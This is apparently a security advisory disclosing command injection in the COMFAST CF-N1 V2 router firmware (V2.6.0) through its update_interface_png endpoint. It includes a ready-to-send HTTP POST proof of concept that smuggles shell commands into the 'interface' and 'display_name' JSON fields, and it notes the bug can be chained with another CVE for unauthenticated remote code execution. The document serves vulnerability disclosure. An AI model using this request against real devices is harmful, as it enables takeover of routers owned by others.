# COMFAST CF-N1 V2 V2.6.0 Command Injection in `update_interface_png`

PS:

1.Setting up the environment using tools like qemu may be difficult; it is recommended to purchase a physical device.

2.This vulnerability can be combined with CVE-2022-45724 to achieve unauthenticated RCE.

## Overview

A command injection vulnerability exists in the COMFAST CF-N1 V2 (firmware V2.6.0) within the `update_interface_png` API (`/usr/bin/webmgnt`, function `sub_41C000`). Attackers can inject arbitrary commands via the `interface` and `display_name` parameters, enabling unauthorized execution of system commands, access to sensitive information, or full compromise of the device.



![PoC Result: Command Execution Evidence](./imgs/0.png)

## Details



*   **Vendor**: COMFAST

*   **Vendor Website**: [http://www.comfast.cn/](http://www.comfast.cn/)

*   **Product**: COMFAST CF-N1 V2

*   **Firmware**: V2.6.0

*   **Firmware Download**: [http://www.comfast.com.cn/index.php?m=content\&c=index\&a=show\&catid=31\&id=772](http://www.comfast.com.cn/index.php?m=content\&c=index\&a=show\&catid=31\&id=772)

*   **Endpoint**: `/cgi-bin/mbox-config?method=SET&section=update_interface_png`

*   **Vulnerability**: Command Injection

*   **CVE ID**: Pending

*   **Impact**: Execute arbitrary system commands, read sensitive files, or take full control of the device.

*   **Reported by**: n0ps1ed (n0ps1edzz@gmail.com)

### Description

The vulnerability resides in the `sub_41C000` function responsible for handling the `update_interface_png` configuration. Disassembly analysis reveals that user-controlled parameters (`interface` and `display_name`) are unsanitized and directly incorporated into a system command via `sprintf_0`, which is then executed using `system_0`.

Key code flow:



1.  User input is parsed via `blobmsg_parse_0`, extracting parameters including `interface` and `display_name`.

2.  These parameters are inserted into a command string using `sprintf_0` with the template `&aSSSSLdSSS` (likely a command for updating interface images, e.g., involving `ld` or file operations).

3.  The constructed command is executed via `system_0` without input validation, allowing attackers to inject arbitrary commands using delimiters like `;`, `&&`, or `#`.

This lack of sanitization enables attackers to break out of the intended command structure and execute malicious code.



![Vulnerable Code Snippet](./imgs/1.png)



![Command Injection Flow](./imgs/2.png)

## Proof of Concept (PoC)

### PoC: Inject Commands via `interface` and `display_name`



```
POST /cgi-bin/mbox-config?method=SET&section=update_interface_png  HTTP/1.1
Host: cflogin.cn
Content-Length: 82
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Content-Type: appliation/json
Origin: http://cflogin.cn
Referer: http://cflogin.cn/guide/guide_router.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: COMFAST_SESSIONID=c0a800a0-ffffffc40f08ffffffaaffffff82fffffff0-6b8b4567
Connection: close

{"interface":"; echo update > /www-comfast/test.txt #","display_name":"&& echo 1"}
```



*   **Notes**: The `interface` parameter uses `;` to terminate the original command and inject `echo update`, while `display_name` uses `&&` to chain an additional `echo 1` command. The `#` comments out remaining syntax to avoid errors.

*   **Steps**:

1.  Send the POST request using tools like Burp Suite or `curl`.

2.  Access `http://cflogin.cn/test.txt` to verify execution of the injected command.

*   **Result**: The file `/www-comfast/test.txt` is created with the content "update", confirming successful command injection.

![PoC Execution Result](./imgs/3.png)

